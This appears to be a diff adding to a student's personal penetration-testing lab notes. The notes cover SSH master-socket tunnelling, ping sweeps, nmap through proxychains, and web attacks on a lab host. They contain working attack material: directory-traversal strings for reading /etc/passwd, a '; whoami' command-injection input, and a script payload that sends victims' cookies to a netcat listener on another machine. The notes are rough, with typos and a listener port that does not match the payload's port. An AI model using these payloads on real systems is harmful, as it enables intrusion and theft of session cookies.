@@ -33,24 +33,60 @@ ssh -S /tmp/jump jump -O forward -D 9050
 ------ESTABLIHS MASTER SOCKET------
 ssh -MS /tmp/jump agent@10.50.15.242        ssh -S /tmp/jump jump
 
+-----------------------------------------------------------------------------------------------------------------
+                    # Create Master Socket
+                    ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null
+                    ssh -S /tmp/demo demo1@10.50.12.21 
+                    
+                    # Host Enum, Ping Sweep (from remote box)
+                    for i in {1..255}; do (ping -c 1 10.208.50.$i | gep "bytes from" &); done
+                    
+                    10.208.50.42
+                    ---------------------------------------
+                    for i in {1..255}; do echo $i; done
+------------------------------------------------------------------------------------------------------------
 
+# Port Enum with dynamic and proxychains 
+ssh -S /tmp/demo demo -O forward -D 9050
+    ss -ntpl | grep 9050  #Sanity check, verify port opened
+proxychains nmap 10.208.50.42
 
+# Tunnel to...
+10.208.50.42
+22/tcp open  ssh
+80/tcp open  http
+ssh -S /tmp/demo demo -O forward -L42070:10.208.50.42:80  #Executed from lin-ops
 
+# HTTP Enum, We would add notes to pages we find 
+# Check /robots.txt
+proxychains nmap --script=http-enum 10.208.50.42 80
+|    /robots.txt
+|    /java/
+|    /path/
+|    /uploads/
+|    /webexample/
+|    /cross/
+|    /cmdinjection/
+|    /texts/
 
+# Directory Traversal takes advantage of READING files and using absolute path 
+../../../../../../etc/passwd
+../../../../../../etc/hosts    #Goes into URL
 
+# CMD Injection uses semi-colon to run commands (not an active shell, can cd) 
+; whoami
 
+# Javascript
+Open Inspector
+Find JS by looking for functions (
+Open console in Inspector and run js manually, e.g. changetext()
 
+# Steal cookies
+Setup nc listener
+nc -lk 10.50.187.52 42071  # Where you want to intercept cookie
 
-
-
-
-
-
-
-
-
-
-
+Post to chat...
+<script>document.location="http://10.50.187.52:42070/?username=" + document.cookie;</script>
 
 
 
